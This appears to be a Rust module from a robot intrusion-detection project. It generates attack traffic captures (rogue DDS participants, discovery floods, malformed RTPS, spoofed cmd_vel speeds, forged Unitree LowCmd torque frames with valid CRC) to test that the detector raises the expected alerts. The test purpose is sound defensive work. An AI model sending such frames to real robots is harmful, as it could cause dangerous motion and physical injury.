//! Scenarios: frame generators and the findings each one must produce.

use crate::net::{self, rtps_prefix, Udp4};
use crate::rng::Rng;
use robodr_capture::{CaptureFile, LinkType, PacketSource, PcapWriter};
use robodr_cdr::unitree::crc::frame_crc;
use robodr_cdr::unitree_legacy::{
    ports, LegacyBmsCmd, LegacyLowCmdCompressed, LegacyMotorCmdCompressed, LEGACY_MOTORS,
};
use std::fmt;
use std::io::{self, BufWriter};
use std::net::Ipv4Addr;
use std::path::Path;
use std::time::Duration;

/// One captured or generated frame (Ethernet II), at an absolute time.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Frame {
    pub ts: Duration,
    pub data: Vec<u8>,
}

/// An attack scenario.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Scenario {
    RogueParticipant,
    GuidSpray,
    MalformedRtps,
    CmdVelEnvelope,
    LowcmdTorque,
}

impl Scenario {
    pub const ALL: [Scenario; 5] = [
        Scenario::RogueParticipant,
        Scenario::GuidSpray,
        Scenario::MalformedRtps,
        Scenario::CmdVelEnvelope,
        Scenario::LowcmdTorque,
    ];

    pub fn name(self) -> &'static str {
        match self {
            Scenario::RogueParticipant => "rogue-participant",
            Scenario::GuidSpray => "guid-spray",
            Scenario::MalformedRtps => "malformed-rtps",
            Scenario::CmdVelEnvelope => "cmd-vel-envelope",
            Scenario::LowcmdTorque => "lowcmd-torque",
        }
    }

    pub fn parse(s: &str) -> Option<Self> {
        Self::ALL.into_iter().find(|x| x.name() == s)
    }

    pub fn describe(self) -> &'static str {
        match self {
            Scenario::RogueParticipant => {
                "a DDS participant the profile does not know joins the robot's discovery bus \
                 (an SPDP announcement cloned from the carrier, new GUID prefix, attacker address)"
            }
            Scenario::GuidSpray => {
                "SPDP announcements with a fresh random GUID prefix each, at a high rate \
                 (discovery flood / participant table exhaustion)"
            }
            Scenario::MalformedRtps => {
                "truncated RTPS headers, impossible submessage lengths, random bodies, mutated \
                 bytes and oversized IP-fragmented datagrams (parser robustness)"
            }
            Scenario::CmdVelEnvelope => {
                "the authorised operator's geometry_msgs/Twist commands rewritten to an \
                 out-of-envelope linear speed (a spoofed, otherwise legitimate writer)"
            }
            Scenario::LowcmdTorque => {
                "Unitree legacy-UDP LowCmd frames from an unlisted host commanding a joint \
                 torque far over any envelope"
            }
        }
    }

    /// Rule ids the daemon must report for this scenario (each at least
    /// once). Checked against `robodr-agentd` by `tests/agentd_e2e.rs`.
    pub fn expected(self) -> &'static [&'static str] {
        match self {
            Scenario::RogueParticipant => &["robot.ros2.unknown_participant"],
            Scenario::GuidSpray => &[
                "robot.ros2.unknown_participant",
                "robot.ros2.discovery_flood",
            ],
            Scenario::MalformedRtps => &["robot.rtps.malformed_discovery"],
            Scenario::CmdVelEnvelope => &["robot.motion.linear_over_envelope"],
            Scenario::LowcmdTorque => &["robot.unitree.legacy_unknown_sender"],
        }
    }

    /// Whether the scenario needs a carrier capture (frames to clone or
    /// rewrite).
    pub fn needs_carrier(self) -> bool {
        !matches!(self, Scenario::LowcmdTorque)
    }
}

impl fmt::Display for Scenario {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.name())
    }
}

/// Scenario parameters.
#[derive(Debug, Clone)]
pub struct Params {
    pub seed: u64,
    /// Source address of attack frames.
    pub attacker_ip: Ipv4Addr,
    pub attacker_mac: [u8; 6],
    /// Start of the attack, after the carrier's first frame.
    pub at: Duration,
    /// Frames of `guid-spray` / `lowcmd-torque`.
    pub count: usize,
    /// Frames per second of generated bursts.
    pub rate_pps: u32,
    /// `cmd-vel-envelope`: commanded linear speed (m/s).
    pub speed: f64,
    /// `lowcmd-torque`: commanded joint torque (N·m, |τ| ≤ 127).
    pub torque_nm: f32,
    /// `lowcmd-torque`: the robot's low-level address.
    pub lowcmd_target: Ipv4Addr,
}

impl Default for Params {
    fn default() -> Self {
        Params {
            seed: 0x5eed,
            attacker_ip: Ipv4Addr::new(10, 77, 10, 66),
            attacker_mac: [0x02, 0x00, 0x5e, 0xad, 0xbe, 0xef],
            at: Duration::from_secs(5),
            count: 3000,
            rate_pps: 1000,
            speed: 3.0,
            torque_nm: 100.0,
            lowcmd_target: Ipv4Addr::new(192, 168, 123, 10),
        }
    }
}

#[derive(Debug)]
pub enum SimError {
    /// The carrier has no frame the scenario can use.
    NoTemplate(&'static str),
    Capture(String),
    Io(io::Error),
    BadParam(String),
}

impl fmt::Display for SimError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            SimError::NoTemplate(w) => write!(f, "carrier capture has no {w}"),
            SimError::Capture(e) => write!(f, "capture: {e}"),
            SimError::Io(e) => write!(f, "{e}"),
            SimError::BadParam(e) => write!(f, "{e}"),
        }
    }
}

impl std::error::Error for SimError {}

impl From<io::Error> for SimError {
    fn from(e: io::Error) -> Self {
        SimError::Io(e)
    }
}

/// Read a pcap / pcapng capture with Ethernet framing.
pub fn read_capture(path: &Path) -> Result<Vec<Frame>, SimError> {
    let mut f = CaptureFile::open(path).map_err(|e| SimError::Capture(e.to_string()))?;
    let mut out = Vec::new();
    while let Some(p) = f
        .next_packet()
        .map_err(|e| SimError::Capture(e.to_string()))?
    {
        if p.linktype != LinkType::ETHERNET {
            return Err(SimError::Capture(format!(
                "link type {} (only Ethernet carriers are supported)",
                p.linktype.0
            )));
        }
        out.push(Frame {
            ts: p.ts,
            data: p.data.to_vec(),
        });
    }
    Ok(out)
}

/// Write frames as a classic pcap (Ethernet, microseconds), in time order.
pub fn write_capture(path: &Path, frames: &[Frame]) -> Result<(), SimError> {
    let file = std::fs::File::create(path)?;
    let mut w = PcapWriter::new(BufWriter::new(file), LinkType::ETHERNET, 262_144, false)?;
    for f in frames {
        let len = u32::try_from(f.data.len()).unwrap_or(u32::MAX);
        w.write_packet(f.ts, &f.data, len)?;
    }
    use std::io::Write;
    w.into_inner().flush()?;
    Ok(())
}

/// The RTPS discovery (SPDP) multicast port of a domain: 7400 + 250 d.
fn is_spdp_port(port: u16) -> bool {
    port >= 7400 && (port - 7400).is_multiple_of(250) && (port - 7400) / 250 <= 232
}

fn spdp_template(carrier: &[Frame]) -> Result<Udp4, SimError> {
    carrier
        .iter()
        .filter_map(|f| net::parse(&f.data))
        .find(|d| is_spdp_port(d.dst_port) && rtps_prefix(&d.payload).is_some())
        .ok_or(SimError::NoTemplate(
            "SPDP announcement (RTPS to port 7400 + 250 d)",
        ))
}

/// `payload` with every occurrence of `old` replaced by `new` (the GUID
/// prefix appears in the header and in PID_PARTICIPANT_GUID).
fn replace_all(payload: &[u8], old: &[u8; 12], new: &[u8; 12]) -> Vec<u8> {
    let mut out = Vec::with_capacity(payload.len());
    let mut i = 0;
    while i < payload.len() {
        if payload.get(i..i + 12) == Some(old.as_slice()) {
            out.extend_from_slice(new);
            i += 12;
        } else {
            out.extend(payload.get(i).copied());
            i += 1;
        }
    }
    out
}

fn from_attacker(mut d: Udp4, p: &Params) -> Udp4 {
    d.src = p.attacker_ip;
    d.src_mac = p.attacker_mac;
    d
}

fn spaced(start: Duration, rate_pps: u32, frames: Vec<Vec<u8>>) -> Vec<Frame> {
    let step = Duration::from_nanos(1_000_000_000 / u64::from(rate_pps.max(1)));
    let mut t = start;
    frames
        .into_iter()
        .map(|data| {
            let f = Frame { ts: t, data };
            t += step;
            f
        })
        .collect()
}

fn with_prefix(tpl: &Udp4, prefix: [u8; 12], p: &Params) -> Result<Udp4, SimError> {
    let old = rtps_prefix(&tpl.payload).ok_or(SimError::NoTemplate("RTPS prefix"))?;
    let mut d = from_attacker(tpl.clone(), p);
    d.payload = replace_all(&tpl.payload, &old, &prefix);
    Ok(d)
}

fn rogue_participant(
    carrier: &[Frame],
    start: Duration,
    p: &Params,
) -> Result<Vec<Frame>, SimError> {
    let tpl = spdp_template(carrier)?;
    let mut rng = Rng::new(p.seed);
    let mut prefix = [0u8; 12];
    rng.fill(&mut prefix);
    let d = with_prefix(&tpl, prefix, p)?;
    // Three periodic announcements, a second apart, as a real participant.
    Ok((0..3u64)
        .map(|k| Frame {
            ts: start + Duration::from_secs(k),
            data: d.frame(),
        })
        .collect())
}

fn guid_spray(carrier: &[Frame], start: Duration, p: &Params) -> Result<Vec<Frame>, SimError> {
    let tpl = spdp_template(carrier)?;
    let mut rng = Rng::new(p.seed);
    let mut frames = Vec::with_capacity(p.count);
    for _ in 0..p.count {
        let mut prefix = [0u8; 12];
        rng.fill(&mut prefix);
        frames.push(with_prefix(&tpl, prefix, p)?.frame());
    }
    Ok(spaced(start, p.rate_pps, frames))
}

fn malformed_rtps(carrier: &[Frame], start: Duration, p: &Params) -> Result<Vec<Frame>, SimError> {
    let tpl = from_attacker(spdp_template(carrier)?, p);
    let payload = tpl.payload.clone();
    let mut rng = Rng::new(p.seed);
    let build = |pl: Vec<u8>| {
        Udp4 {
            payload: pl,
            ..tpl.clone()
        }
        .frame()
    };
    let mut out = Vec::new();
    // Truncated RTPS headers.
    for _ in 0..10 {
        for k in 1..20 {
            out.push(build(payload.get(..k).unwrap_or_default().to_vec()));
        }
    }
    // First submessage length past the end of the datagram.
    let mut bad = payload.clone();
    if let Some(len) = bad.get_mut(22..24) {
        len.copy_from_slice(&[0xff, 0xff]);
    }
    for _ in 0..100 {
        out.push(build(bad.clone()));
    }
    // Random bytes behind a valid RTPS header.
    let header = payload.get(..20).unwrap_or_default().to_vec();
    for _ in 0..1000 {
        let mut pl = header.clone();
        let n = 1 + rng.below(1400);
        pl.extend(rng.bytes(n));
        out.push(build(pl));
    }
    // Submessage ids, flags and lengths randomised in place.
    if payload.len() > 21 {
        for _ in 0..1000 {
            let mut b = payload.clone();
            for _ in 0..8 {
                let j = 20 + rng.below(b.len() - 20);
                if let Some(x) = b.get_mut(j) {
                    *x = rng.next_u64() as u8;
                }
            }
            out.push(build(b));
        }
    }
    // Oversized: 60 KiB RTPS datagrams in IP fragments, one never completed.
    for k in 0..5u16 {
        let mut pl = header.clone();
        pl.extend(rng.bytes(60_000));
        let d = Udp4 {
            payload: pl,
            ..tpl.clone()
        };
        out.extend(d.fragments(1480, 0x5000 + k));
    }
    let mut pl = header;
    pl.extend(rng.bytes(60_000));
    let mut frags = Udp4 {
        payload: pl,
        ..tpl.clone()
    }
    .fragments(1480, 0x6000);
    frags.pop();
    out.extend(frags);
    Ok(spaced(start, p.rate_pps.saturating_mul(2), out))
}

fn rd_u16(b: &[u8], at: usize, le: bool) -> Option<u16> {
    let a = b.get(at..)?.first_chunk::<2>().copied()?;
    Some(if le {
        u16::from_le_bytes(a)
    } else {
        u16::from_be_bytes(a)
    })
}

/// Rewrite `linear.x` of every `geometry_msgs/Twist` sample (XCDR1 little
/// endian, 48 bytes of doubles) in an RTPS message; the number rewritten.
fn rewrite_twist(payload: &mut [u8], speed: f64) -> usize {
    const DATA: u8 = 0x15;
    let mut n = 0;
    let mut off = 20;
    while off + 4 <= payload.len() {
        let (Some(&id), Some(&flags)) = (payload.get(off), payload.get(off + 1)) else {
            break;
        };
        let le = flags & 0x01 != 0;
        let Some(slen) = rd_u16(payload, off + 2, le) else {
            break;
        };
        let body = off + 4;
        let end = if slen == 0 {
            payload.len()
        } else {
            body + usize::from(slen)
        };
        if end > payload.len() {
            break;
        }
        if id == DATA && flags & 0x04 != 0 {
            if let Some(q0) = rd_u16(payload, body + 2, le) {
                let mut q = body + 4 + usize::from(q0);
                if flags & 0x02 != 0 {
                    // Inline QoS: a parameter list ending in PID_SENTINEL.
                    while let (Some(pid), Some(plen)) =
                        (rd_u16(payload, q, le), rd_u16(payload, q + 2, le))
                    {
                        q += 4 + usize::from(plen);
                        if pid == 1 || q >= end {
                            break;
                        }
                    }
                }
                let data_len = end.saturating_sub(q);
                let cdr_le = payload.get(q..q + 2) == Some(&[0x00, 0x01][..]);
                if (52..=56).contains(&data_len) && cdr_le {
                    if let Some(x) = payload.get_mut(q + 4..q + 12) {
                        let old = f64::from_le_bytes(x.try_into().unwrap_or([0; 8]));
                        let v = if old < 0.0 { -speed } else { speed };
                        x.copy_from_slice(&v.to_le_bytes());
                        n += 1;
                    }
                }
            }
        }
        off = end;
    }
    n
}

fn cmd_vel_envelope(
    carrier: &[Frame],
    start: Duration,
    p: &Params,
) -> Result<Vec<Frame>, SimError> {
    let mut out = Vec::with_capacity(carrier.len());
    let mut n = 0;
    for f in carrier {
        if f.ts >= start {
            if let Some(mut d) = net::parse(&f.data) {
                if rtps_prefix(&d.payload).is_some() {
                    let k = rewrite_twist(&mut d.payload, p.speed);
                    if k > 0 {
                        n += k;
                        out.push(Frame {
                            ts: f.ts,
                            data: d.frame(),
                        });
                        continue;
                    }
                }
            }
        }
        out.push(f.clone());
    }
    if n == 0 {
        return Err(SimError::NoTemplate(
            "geometry_msgs/Twist sample after the attack start",
        ));
    }
    Ok(out)
}

/// One compressed (v3.8.6) legacy `LowCmd` with `torque_nm` on motor 2 and
/// a valid plain CRC.
pub fn lowcmd_frame(torque_nm: f32, sn: u32) -> Vec<u8> {
    let mut motors = [LegacyMotorCmdCompressed::default(); LEGACY_MOTORS];
    if let Some(m) = motors.get_mut(2) {
        m.mode = 0x0A;
        m.q_bits = 2.146e9f32.to_bits(); // PosStopF: no position target
        m.dq_bits = 16000.0f32.to_bits(); // VelStopF
        let q = (torque_nm * 256.0).clamp(f32::from(i16::MIN), f32::from(i16::MAX));
        m.tau_q = q as i16;
    }
    let mut cmd = LegacyLowCmdCompressed {
        head: [0xFE, 0xEF],
        level_flag: 0xff,
        frame_reserve: 0,
        sn: [sn, 0],
        version: [0, 0],
        band_width: 0,
        motor_cmd: motors,
        bms: LegacyBmsCmd {
            off: 0,
            reserve: [0; 3],
        },
        wireless_remote: [0; 40],
        reserve: 0,
        crc: 0,
    };
    cmd.crc = frame_crc(&cmd.encode()).unwrap_or(0);
    cmd.encode().to_vec()
}

fn lowcmd_torque(start: Duration, p: &Params) -> Result<Vec<Frame>, SimError> {
    if !(p.torque_nm.is_finite() && p.torque_nm.abs() <= 127.0) {
        return Err(SimError::BadParam(
            "torque must be finite and within ±127 N·m (Q8 wire range)".into(),
        ));
    }
    let count = p.count.min(10_000);
    let frames = (0..count)
        .map(|k| {
            Udp4 {
                dst_mac: [0x02, 0x00, 0x00, 0x00, 0x00, 0x10],
                src_mac: p.attacker_mac,
                src: p.attacker_ip,
                dst: p.lowcmd_target,
                src_port: ports::CLIENT_PORT,
                dst_port: ports::SERVER_PORT_BASIC,
                payload: lowcmd_frame(p.torque_nm, k as u32),
            }
            .frame()
        })
        .collect();
    Ok(spaced(start, p.rate_pps, frames))
}

fn checked_start(s: Scenario, carrier: &[Frame], p: &Params) -> Result<Duration, SimError> {
    if p.count == 0 || p.rate_pps == 0 {
        return Err(SimError::BadParam("count and rate must be > 0".into()));
    }
    if s.needs_carrier() && carrier.is_empty() {
        return Err(SimError::NoTemplate("frames (empty carrier)"));
    }
    let t0 = carrier
        .iter()
        .map(|f| f.ts)
        .min()
        .unwrap_or(Duration::from_secs(1_790_000_000));
    Ok(t0 + p.at)
}

/// Only the scenario's own frames, in time order: what a live sender
/// transmits (for `cmd-vel-envelope`, the rewritten samples).
pub fn attack_frames(s: Scenario, carrier: &[Frame], p: &Params) -> Result<Vec<Frame>, SimError> {
    let start = checked_start(s, carrier, p)?;
    match s {
        Scenario::CmdVelEnvelope => Ok(cmd_vel_envelope(carrier, start, p)?
            .into_iter()
            .zip(carrier)
            .filter(|(a, c)| a != *c)
            .map(|(a, _)| a)
            .collect()),
        Scenario::RogueParticipant => rogue_participant(carrier, start, p),
        Scenario::GuidSpray => guid_spray(carrier, start, p),
        Scenario::MalformedRtps => malformed_rtps(carrier, start, p),
        Scenario::LowcmdTorque => lowcmd_torque(start, p),
    }
}

/// The carrier with the scenario applied, in time order. An empty carrier
/// starts at 2026-09-21T14:13:20Z.
pub fn generate(s: Scenario, carrier: &[Frame], p: &Params) -> Result<Vec<Frame>, SimError> {
    if s == Scenario::CmdVelEnvelope {
        let start = checked_start(s, carrier, p)?;
        return cmd_vel_envelope(carrier, start, p);
    }
    let mut out = attack_frames(s, carrier, p)?;
    out.extend(carrier.iter().cloned());
    // Stable: at equal times the attack frame stays first.
    out.sort_by_key(|f| f.ts);
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use robodr_cdr::unitree_legacy::LegacyLowCmdCompressed;

    fn spdp(prefix: [u8; 12]) -> Frame {
        let mut payload = b"RTPS\x02\x03\x01\x0f".to_vec();
        payload.extend_from_slice(&prefix);
        // A fake PID_PARTICIPANT_GUID carrying the prefix again.
        payload.extend_from_slice(&[0x50, 0x00, 0x10, 0x00]);
        payload.extend_from_slice(&prefix);
        payload.extend_from_slice(&[0, 0, 1, 0xc1]);
        Frame {
            ts: Duration::from_secs(100),
            data: Udp4 {
                dst_mac: [1; 6],
                src_mac: [2; 6],
                src: Ipv4Addr::new(10, 77, 10, 10),
                dst: Ipv4Addr::new(239, 255, 0, 1),
                src_port: 40000,
                dst_port: 7400,
                payload,
            }
            .frame(),
        }
    }

    #[test]
    fn names_round_trip_and_every_scenario_expects_something() {
        for s in Scenario::ALL {
            assert_eq!(Scenario::parse(s.name()), Some(s));
            assert!(!s.expected().is_empty());
        }
        assert_eq!(Scenario::parse("nope"), None);
    }

    #[test]
    fn rogue_replaces_every_copy_of_the_prefix_and_the_source() {
        let carrier = vec![spdp([0xAA; 12])];
        let out = generate(Scenario::RogueParticipant, &carrier, &Params::default()).unwrap();
        assert_eq!(out.len(), 4);
        let rogue: Vec<_> = out
            .iter()
            .filter_map(|f| net::parse(&f.data))
            .filter(|d| d.src == Params::default().attacker_ip)
            .collect();
        assert_eq!(rogue.len(), 3);
        let pfx = rtps_prefix(&rogue[0].payload).unwrap();
        assert_ne!(pfx, [0xAA; 12]);
        assert!(!rogue[0].payload.windows(12).any(|w| w == [0xAA; 12]));
        assert_eq!(
            rogue[0].payload.windows(12).filter(|w| *w == pfx).count(),
            2
        );
        // Reproducible from the seed.
        let again = generate(Scenario::RogueParticipant, &carrier, &Params::default()).unwrap();
        assert_eq!(out, again);
    }

    #[test]
    fn spray_uses_distinct_prefixes_at_the_rate() {
        let p = Params {
            count: 500,
            ..Params::default()
        };
        let out = generate(Scenario::GuidSpray, &[spdp([1; 12])], &p).unwrap();
        let mut prefixes: Vec<_> = out
            .iter()
            .filter_map(|f| net::parse(&f.data))
            .filter_map(|d| rtps_prefix(&d.payload))
            .collect();
        prefixes.sort();
        prefixes.dedup();
        assert_eq!(prefixes.len(), 501);
        let span = out.last().unwrap().ts - out[1].ts;
        assert!(span >= Duration::from_millis(498), "{span:?}");
    }

    #[test]
    fn malformed_and_carrier_requirements() {
        let out = generate(
            Scenario::MalformedRtps,
            &[spdp([1; 12])],
            &Params::default(),
        )
        .unwrap();
        assert!(out.len() > 2000);
        assert!(matches!(
            generate(Scenario::GuidSpray, &[], &Params::default()),
            Err(SimError::NoTemplate(_))
        ));
        assert!(matches!(
            generate(
                Scenario::CmdVelEnvelope,
                &[spdp([1; 12])],
                &Params::default()
            ),
            Err(SimError::NoTemplate(_))
        ));
    }

    #[test]
    fn twist_rewrite_hits_only_twist_samples() {
        // RTPS header + one little-endian DATA submessage with a Twist.
        let mut m = b"RTPS\x02\x03\x01\x0f".to_vec();
        m.extend_from_slice(&[7; 12]);
        let mut body = vec![0, 0, 16, 0]; // extraFlags, octetsToInlineQos = 16
        body.extend_from_slice(&[0; 16]); // reader id, writer id, sequence number
        body.extend_from_slice(&[0x00, 0x01, 0, 0]);
        for v in [0.3f64, 0.0, 0.0, 0.0, 0.0, 0.1] {
            body.extend_from_slice(&v.to_le_bytes());
        }
        m.extend_from_slice(&[0x15, 0x05]);
        m.extend_from_slice(&(body.len() as u16).to_le_bytes());
        m.extend_from_slice(&body);
        let mut a = m.clone();
        assert_eq!(rewrite_twist(&mut a, 3.0), 1);
        let x = f64::from_le_bytes(a[48..56].try_into().unwrap());
        assert_eq!(x, 3.0);
        // Same submessage without the data flag: untouched.
        let mut b = m.clone();
        b[21] = 0x01;
        assert_eq!(rewrite_twist(&mut b, 3.0), 0);
        // Truncated: no panic, nothing rewritten.
        let mut c = m[..30].to_vec();
        assert_eq!(rewrite_twist(&mut c, 3.0), 0);
    }

    #[test]
    fn lowcmd_frame_decodes_with_the_torque_and_a_valid_crc() {
        let f = lowcmd_frame(100.0, 9);
        let d = LegacyLowCmdCompressed::decode(&f).unwrap();
        assert_eq!(d.motor_cmd[2].tau_q, 25_600);
        assert_eq!(d.level_flag, 0xff);
        assert_eq!(
            LegacyLowCmdCompressed::crc_check(&f, Default::default()),
            Some(true)
        );
        let p = Params {
            count: 10,
            ..Params::default()
        };
        let out = generate(Scenario::LowcmdTorque, &[], &p).unwrap();
        assert_eq!(out.len(), 10);
        let bad = Params {
            torque_nm: 500.0,
            ..p
        };
        assert!(generate(Scenario::LowcmdTorque, &[], &bad).is_err());
    }
}
